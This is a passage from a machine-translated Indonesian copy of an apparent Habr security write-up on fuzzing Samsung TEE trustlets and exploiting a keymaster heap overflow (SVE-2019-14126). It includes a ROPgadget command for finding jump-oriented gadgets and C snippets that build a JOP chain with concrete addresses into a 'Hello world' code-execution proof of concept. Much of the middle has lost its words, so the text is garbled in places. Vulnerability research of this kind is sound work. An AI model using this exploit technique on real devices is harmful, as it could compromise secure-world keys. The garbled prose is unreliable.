</li><li>  jenis kesalahan (jenis sinyal saat crash); </li><li>  Alamat tempat kesalahan terjadi </li><li>  Fungsi API yang digunakan oleh trastlet. </li></ul><br><p>  Ternyata, sangat nyaman untuk memasukkan semua informasi ini ke dalam basis data, dan kemudian memilih kasus yang paling menarik untuk dianalisis oleh kueri SQL dan menambahkan informasi sesuai dengan analisis. </p><br><p><img src="https://habrastorage.org/webt/k_/uk/mm/k_ukmmhlewkiem_fvzwfms-eiai.png"></p><br><p>  Misalnya, dengan kueri ini, Anda dapat menampilkan semua kasus pengujian tempat kesalahan kesalahan Segmentasi terjadi: </p><br><pre> <code class="plaintext hljs">select * from main where type = "SIGSEGV";</code> </pre> <br><p>  Dan memfilter kasus uji yang menggunakan fungsi <code>tlApiSecSPICmd</code> , yang telah kami implementasikan sebagai rintisan: </p><br><pre> <code class="plaintext hljs">select * from main where api not like "tlApiSecSPICmd";</code> </pre> <br><p>  Dengan demikian, kesalahan dari berbagai jenis ditemukan di semua trustlets.  Beberapa dari mereka tidak mengarah pada kerentanan, tetapi ada beberapa yang rentan dan dapat digunakan oleh penyerang.  Pertimbangkan kerentanan paling menarik yang ditemukan. </p><br><h2 id="sve-2019-14126">  SVE-2019-14126 </h2><br><p><img src="https://habrastorage.org/webt/ji/zy/hr/jizyhrbu1vcna9da47r_s0dmjdy.png"></p><br><p>  Kerentanan itu ditemukan dalam trustlet keymaster dalam kode untuk memproses konten buffer TCI sambil mem-parsing struktur ASN.1 yang disandikan sesuai dengan aturan DER.  Dua bidang dalam struktur ini digunakan sebagai dimensi: satu saat mengalokasikan memori dinamis, dan yang lain saat menyalinnya.  Jelas, jika ukuran kedua lebih besar dari yang pertama, terjadi tumpukan tumpukan.  Kerentanan seperti itu biasanya mengarah pada kemungkinan eksekusi kode oleh penyerang, jadi kami mencoba untuk membuat exploit penuh untuk kerentanan ini.  Ketika menilai kemungkinan eksploitasi, seseorang juga harus memperhitungkan semua batasan kepercayaan yang disebutkan di atas. </p><br><p>  Memiliki tumpukan overflow dan berdasarkan pada pembatasan ini, orang dapat membayangkan strategi operasi berikut: </p><br><ol><li>  temukan beberapa penunjuk fungsi di tempat yang dapat diakses untuk menulis ulang, misalnya, di bagian .bss; </li><li>  Menggunakan overflow yang ditemukan, buat blok memori tumpukan di tempat ini; </li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> memulai alokasi memori di lokasi tertentu dan menimpa penunjuk fungsi; </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> memulai penunjuk fungsi panggilan ditimpa. </font></font></li></ol><br><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Untuk melakukan ini, tentu saja, Anda perlu memahami secara rinci bagaimana tumpukan bekerja di sistem operasi Kinibi. </font><font style="vertical-align: inherit;">Untuk melakukan ini, kami harus merekayasa balik fungsi mengalokasikan dan membebaskan memori mclib, tetapi sekarang Anda dapat melihat deskripsi yang baik tentang tumpukan di </font></font><a href="https://downloads.immunityinc.com/infiltrate2019-slidepacks/eloi-sanfelix-exploiting-trusted-apps-in-samsung-tee/TEE.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">laporan ini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dari konferensi ZeroCon pada bulan April.</font></font></p><br><p>     —        .bss.            ,   .bss       .               , ,  ,    ,       . </p><br><p><img src="https://habrastorage.org/webt/l8/ng/jb/l8ngjbgjfox8nubn0ipgjmay70s.jpeg"></p><br><p>  ,       .bss,      . </p><br><p>        ,      . ,       ,    ,    ,       .bss,   .     <em></em>     code-reuse. </p><br><p>     ROP. ,    ROP,            .bss.      ,      ,          .   ,     ,             .     , , ,   . </p><br><p>  ROP,    JOP. JOP —  Jump Oriented Programming.  JOP            . </p><br><p>     JOP ,    ROPGadget.     ,     JOP,      : </p><br><pre> <code class="plaintext hljs">ROPgadget --binary tlrun --thumb --range 0x1000-0xbeb44 | grep -E "; b.+ r[0-9]+$"</code> </pre> <br><p>  !       . </p><br><p><img src="https://habrastorage.org/webt/ti/oz/96/tioz96g4dhzaugtxtlr0d4sq4cc.png"></p><br><p>       .  ROP             .  ,  ROP-   <a href="https://en.wikipedia.org/wiki/Weird_machine">weird machine</a> ,    .   JOP     ,          .   ARM,      ,  ,     — LDMIA (Load Memory Increment Address). </p><br><p><img src="https://habrastorage.org/webt/i6/vm/pu/i6vmpufz2lpz6aoeapmujzc7xa0.png"></p><br><p>      ,  ,         ,   ,   .         ,            .        JOP! </p><br><p>       LDMIA   . - capstone,    ROPGadget,     LDMLO. </p><br><p><img src="https://habrastorage.org/webt/hm/5l/vi/hm5lvigl8qx96w_xtjasd2ngeie.png"></p><br><p>    !   .         ,         ,  .   stack cookie  ,    . </p><br><pre> <code class="plaintext hljs">*(int*)&amp;mem1[offset] = SUPER_GADGET; // r2 *(int*)&amp;mem1[offset + 4] = 0; // r3 *(int*)&amp;mem1[offset + 8] = 0; // r4 *(int*)&amp;mem1[offset + 12] = SUPER_GADGET; // r5 *(int*)&amp;mem1[offset + 16] = 0x9560b; // r7 offset += 0x14; *(int*)&amp;mem1[offset] = 0; // r2 *(int*)&amp;mem1[offset + 4] = 0; // r3 *(int*)&amp;mem1[offset + 8] = 0; // r4 *(int*)&amp;mem1[offset + 12] = 0; // r5 *(int*)&amp;mem1[offset + 16] = 0x96829; // r7 offset += 0x14; *(int*)&amp;mem1[offset] = SUPER_GADGET; // r2 *(int*)&amp;mem1[offset + 4] = 0; // r3 *(int*)&amp;mem1[offset + 8] = 0x3d5f4; // r4 *(int*)&amp;mem1[offset + 12] = mapInfo3.sVirtualAddr; // r5 *(int*)&amp;mem1[offset + 16] = 0x218c7; // r7</code> </pre> <br><p> Hello, world       . </p><br><pre> <code class="plaintext hljs">strcpy(mem3 + 0x100, "Hello world from TEE!\n"); *(int*)&amp;mem1[offset] = 0x7d081b1; // r2 *(int*)&amp;mem1[offset + 4] = 0; // r3 *(int*)&amp;mem1[offset + 8] = mapInfo3.sVirtualAddr + 0x100; // r4 *(int*)&amp;mem1[offset + 12] = 0; // r5 *(int*)&amp;mem1[offset + 16] = 0x9545b; // r7</code> </pre> <br><p><img src="https://habrastorage.org/webt/qt/ay/jo/qtayjouk0l2xu35tl2v2faovzlw.png"></p><br><p>  "Hello, world!"   , , ,   keymaster, ,   .        ,     . ,  <a href="http://bits-please.blogspot.com/2016/06/extracting-qualcomms-keymaster-keys.html"> </a> Gal Beniamini  TEE Qualcomm         ,  ,  offline-     Android.          TEE OS     EL-3,         . </p><br><h2 id="zaklyuchenie">  Kesimpulan </h2><br><p> ARM TrustZone             ,            .     Secure World         Android,              .  , , Samsung   <a href="">bug bounty</a>      TrustZone,     . </p><br><p><img src="https://habrastorage.org/webt/ai/rq/ii/airqiifvmexik-gscxzzpu1ohbo.png"></p><br><p>      AFL  qemu,         ""  .            .              ,        .     ! </p><br><h2 id="poleznye-ssylki">  Tautan yang bermanfaat </h2><br><ul><li> <a href="https://blog.quarkslab.com/reverse-engineering-samsung-s6-sboot-part-i.html">Reverse Engineering Samsung S6 SBOOT</a> </li><li> <a href="https://medium.com/taszksec/unbox-your-phone-part-i-331bbf44c30c">Unbox Your Phone</a> </li><li> <a href="https://googleprojectzero.blogspot.com/2017/07/trust-issues-exploiting-trustzone-tees.html">Trust Issues: Exploiting TrustZone TEEs</a> </li><li> <a href="https://downloads.immunityinc.com/infiltrate2019-slidepacks/eloi-sanfelix-exploiting-trusted-apps-in-samsung-tee/TEE.pdf">TEE Exploitation: Exploiting Trusted Apps on Samsung's TEE at Zer0con 2019</a> </li><li> <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Peterlin-Breaking-Samsungs-ARM-TrustZone.pdf">BREAKING SAMSUNG'S ARM TRUSTZONE at BlackHat USA 2019</a> </li><li> <a href="https://cfp.recon.cx/reconmtl2019/talk/DYGNJQ/">The road to Qualcomm TrustZone apps fuzzing</a> </li><li> <a href="http://allsoftwaresucks.blogspot.com/2019/05/reverse-engineering-samsung-exynos-9820.html">Reverse-engineering Samsung Exynos 9820 bootloader and TZ</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id478948/">https://habr.com/ru/post/id478948/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id478930/index.html">Cara menggunakan MySQL tanpa kata sandi (dan risiko keamanan)</a></li>
<li><a href="../id478932/index.html">Docker untuk front-end. Bagian 1. Mengapa?</a></li>
<li><a href="../id478934/index.html">Modul library standar Python yang paling berguna yang selalu dilupakan setiap orang</a></li>
<li><a href="../id478938/index.html">Kami mempelajari janji berdasarkan spesifikasi Ecmascript. Kenalan</a></li>
<li><a href="../id478942/index.html">Eksperimen porno yang hebat: sejarah Internet untuk orang dewasa</a></li>
<li><a href="../id478950/index.html">Hasil minggu ini: Huawei beradaptasi dengan sanksi, Putin menandatangani undang-undang yang sensasional, dan ShutterStock diblokir di Rusia</a></li>
<li><a href="../id478952/index.html">Sebulan dengan Onyx Boox Note Pro</a></li>
<li><a href="../id478954/index.html">RE: Ketakutan dan Kebencian pada IT</a></li>
<li><a href="../id478956/index.html">Memperkenalkan Pembaruan 3CX V16 4 Beta dengan Klien VoIP Chrome dan Aplikasi Video untuk Android</a></li>
<li><a href="../id478958/index.html">Panduan Lengkap Upgrade Windows 10 untuk Perusahaan dari Segala Ukuran</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>